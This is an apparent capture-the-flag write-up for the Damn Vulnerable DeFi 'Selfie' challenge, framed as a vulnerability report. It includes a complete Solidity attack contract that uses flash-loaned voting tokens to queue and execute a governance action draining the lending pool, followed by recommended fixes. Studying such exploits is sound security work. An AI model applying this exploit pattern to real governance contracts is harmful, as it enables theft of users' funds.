# Selfie

A new lending pool has launched! It's now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.

# Selfie Challenge - Vulnerability Report

## Overview
The Selfie challenge demonstrates a critical vulnerability in a governance system that allows an attacker to drain all funds from a lending pool by exploiting the flash loan mechanism and governance voting power. The vulnerability stems from the ability to temporarily acquire voting power through flash loans to propose and execute malicious actions.

## Challenge Description
The challenge consists of three main components:
1. A lending pool (`SelfiePool`) that offers flash loans of DVT tokens
2. A governance system (`SimpleGovernance`) that controls the pool
3. A voting token (`DamnValuableVotes`) that determines governance power

The goal is to drain all 1.5 million DVT tokens from the pool.

## Vulnerability Details

### Severity: Critical
- Impact: High - Allows complete draining of the pool
- Likelihood: High - Simple to exploit
- CVSS Score: 9.0

### Location
The vulnerability exists in the interaction between `SelfiePool` and `SimpleGovernance` contracts, specifically in how the governance system handles voting power and action execution.

### Impact
An attacker can drain all funds from the lending pool by:
1. Taking a flash loan to temporarily acquire voting power
2. Using that power to propose a malicious action
3. Executing the action after the required delay
4. Repaying the flash loan

### Root Cause
The vulnerability arises from two main issues:

1. **Temporary Voting Power**: The governance system doesn't distinguish between temporary and permanent voting power. This allows an attacker to use flash loans to temporarily acquire enough tokens to propose actions.

2. **Delayed Action Execution**: The governance system has a 2-day delay for executing actions, but this delay doesn't prevent the attack since the attacker can wait for the delay period to pass.

## Proof of Concept

```solidity
contract AttackContract is IERC3156FlashBorrower {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes token;
    address recovery;
    uint256 actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool, address _governance, address _token, address _recovery) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    function startAttack() external {
        uint256 amount = SelfiePool(pool).maxFlashLoan(address(token));
        SelfiePool(pool).flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(
        address sender,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(msg.sender == address(pool), "Pool is not sender");
        require(sender == address(this), "Sender is not the owner");

        token.delegate(address(this));

        bytes memory payload = abi.encodeWithSignature("emergencyExit(address)", recovery);
        actionId = governance.queueAction(address(pool), 0, payload);

        token.approve(address(pool), amount);
        return CALLBACK_SUCCESS;
    }

    function executeProposal() external {
        governance.executeAction(actionId);
    }
}
```

### Attack Steps
1. Deploy the attack contract with addresses for:
   - The pool (`SelfiePool`)
   - The governance contract (`SimpleGovernance`)
   - The token (`DamnValuableVotes`)
   - The recovery address

2. Call `startAttack()` which:
   - Takes a flash loan of all pool tokens
   - Uses the borrowed tokens to queue a governance action
   - Repays the flash loan

3. The `onFlashLoan` callback:
   - Verifies the sender is the pool
   - Delegates voting power to the attack contract
   - Creates and queues a call to `emergencyExit()` targeting the recovery address
   - Approves the pool to take back the borrowed tokens
   - Returns the required callback success value

4. Wait for the 2-day governance delay

5. Call `executeProposal()` to:
   - Execute the queued action
   - Drain all tokens to the recovery address

### Expected Outcome
- The pool's balance is reduced to 0
- All tokens are transferred to the recovery address
- The attack is executed in three steps:
  1. Deploy and initialize attack contract
  2. Execute flash loan and queue action
  3. Execute the queued action after delay

## Recommendations

### Short-term Fix
1. Add a minimum holding period for voting power:
```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    uint256 holdingTime = _votingToken.getPastVotes(who, block.timestamp - 7 days);
    return balance > halfTotalSupply && holdingTime > halfTotalSupply;
}
```

### Long-term Fixes
1. Implement a more robust governance system that:
   - Requires tokens to be locked for voting
   - Has a minimum holding period for voting power
   - Implements a timelock for all actions
2. Add additional checks in the pool's emergency exit function
3. Consider using a different governance mechanism that can't be manipulated through flash loans
4. Implement rate limiting for governance actions

## Additional Notes
This vulnerability is a classic example of how flash loans can be used to manipulate governance systems. The attack is possible because the governance system doesn't distinguish between temporary and permanent token holdings, allowing an attacker to temporarily acquire enough voting power to propose malicious actions.

## References
- [OpenZeppelin's Governance Implementation](https://docs.openzeppelin.com/contracts/4.x/api/governance)
- [Flash Loan Attacks](https://consensys.github.io/smart-contract-best-practices/attacks/flash-loans/)
- [Governance Best Practices](https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/)
